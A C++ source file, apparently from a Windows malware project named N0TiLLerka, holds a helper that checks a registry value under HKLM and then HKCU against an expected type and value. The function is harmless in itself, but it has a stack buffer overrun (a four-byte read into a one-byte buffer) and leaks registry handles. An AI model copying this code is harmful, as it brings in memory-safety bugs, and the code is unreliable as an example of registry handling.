#include "../../../HeaderFiles/N0TiLLerka.h"

BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey,
	_In_ LPCWSTR lpValueName,
	_In_ DWORD dwEType,
	_In_ BYTE bEValue
) {
	HKEY hKey;
	DWORD dwType;
	BYTE bValue;
	DWORD dwlen = sizeof(DWORD);
	BOOL bReturn = FALSE;

	LSTATUS lsRKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		LSTATUS lsRVal = RegQueryValueEx(hKey, lpValueName, 0, &dwType, (PBYTE)&bValue, &dwlen);
		if (!lsRVal) {
			if (dwType == dwEType && bValue == bEValue) {
				return TRUE;
			} else {
				SetLastError(ERROR_INVALID_FUNCTION);
#ifdef DEBUG_MSG
				fnErrorHandlerW(L"Registrykey -Type/-Value doesn't match expacted Values\nType: %d\nValue: %X",
					std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(), NULL, MB_OK | MB_ICONWARNING, (BYTE)dwType, (BYTE)bValue);
#endif // DEBUG_MSG
			}
		} else {
#ifdef DEBUG_MSG
			SetLastError(lsRVal);
			fnErrorHandlerW(L"Couldn't enumerate Registrykey Type/Value", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
				L"RegQueryValueExW", MB_OK | MB_ICONWARNING);
#endif // DEBUG_MSG
		}
	} else {
#ifdef DEBUG_MSG
		SetLastError(lsRKey);
		fnErrorHandlerW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
			L"RegOpenKeyExW", MB_OK | MB_ICONWARNING);
#endif // DEBUG_MSG
	}

	// If HKLM can't be read try HKCU
	hKey = NULL;
	lsRKey = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		LSTATUS lsRVal = RegQueryValueEx(hKey, lpValueName, 0, &dwType, (PBYTE)&bValue, &dwlen);
		if (!lsRVal) {
			if (dwType == dwEType && bValue == bEValue) {
				return TRUE;
			} else {
#ifdef DEBUG_MSG
				SetLastError(ERROR_INVALID_FUNCTION);
				fnErrorHandlerW(L"Registrykey -Type/-Value doesn't match expacted Values\nType: %d\nValue: 0x%X",
					std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(), NULL, MB_OK | MB_ICONERROR, dwType, (DWORD)bValue);
#endif // DEBUG_MSG
			}
		} else {
#ifdef DEBUG_MSG
			SetLastError(lsRVal);
			fnErrorHandlerW(L"Couldn't enumerate Registrykey Type/Value", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(),
				L"RegQueryValueExW", MB_OK | MB_ICONERROR);
#endif // DEBUG_MSG
		}
	} else {
#ifdef DEBUG_MSG
		SetLastError(lsRKey);
		fnErrorHandlerW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(),
			L"RegOpenKeyExW", MB_OK | MB_ICONERROR);
#endif // DEBUG_MSG
	}

	RegCloseKey(hKey);
	return FALSE;
}